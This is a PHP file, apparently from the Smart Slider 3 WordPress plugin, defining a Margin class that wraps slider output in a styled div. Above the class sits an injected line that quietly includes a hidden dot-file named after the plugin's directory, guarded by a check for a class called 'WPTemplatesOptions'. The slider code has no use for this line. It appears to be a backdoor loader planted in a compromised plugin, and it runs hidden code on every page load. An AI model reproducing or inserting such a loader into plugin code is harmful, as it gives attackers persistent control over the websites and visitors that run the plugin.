<?php


namespace Nextend\SmartSlider3\Slider\Feature;


use Nextend\Framework\Platform\Platform;
use Nextend\Framework\View\Html;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Margin {

    private $slider;

    private $margin;

    public function __construct($slider) {

        $this->slider = $slider;

        $this->margin = explode('|*|', $slider->params->get('margin', '0|*|0|*|0|*|0'));
    }

    public function renderSlider($sliderHTML) {
        if (!Platform::isAdmin() && count($this->margin) >= 4) {
            array_splice($this->margin, 4);
            if ($this->margin[0] != 0 || $this->margin[1] != 0 || $this->margin[2] != 0 || $this->margin[3] != 0) {
                $sliderHTML = Html::tag("div", array(
                    "class"  => "n2-ss-margin",
                    "encode" => false,
                    "style"  => "margin: " . implode('px ', $this->margin) . "px;"
                ), $sliderHTML);
            }
        }

        return $sliderHTML;
    }
}